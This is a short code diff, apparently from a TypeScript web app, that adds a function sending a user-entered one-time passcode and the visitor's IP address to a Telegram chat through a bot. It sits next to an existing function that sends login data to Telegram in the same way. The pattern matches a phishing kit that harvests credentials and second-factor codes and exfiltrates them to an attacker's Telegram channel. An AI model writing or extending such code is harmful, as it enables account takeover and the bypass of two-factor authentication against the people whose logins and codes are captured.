@@ -43,3 +43,23 @@ export async function sendLoginDataToTelegram(data: any) {
     return { success: false, message: 'Failed to send login data.' };
   }
 }
+
+export async function sendOtpToTelegram(otp: string) {
+    const headersList = headers();
+    const ip = headersList.get('x-forwarded-for') || 'Not available';
+
+    const message = `
+        OTP Entered
+        -----------
+        IP Address: ${ip}
+        OTP: ${otp}
+    `;
+
+    try {
+        await bot.sendMessage(chatId, message);
+        return { success: true, message: "OTP sent." };
+    } catch (error) {
+        console.error('Failed to send OTP to Telegram:', error);
+        return { success: false, message: 'Failed to send OTP.' };
+    }
+}
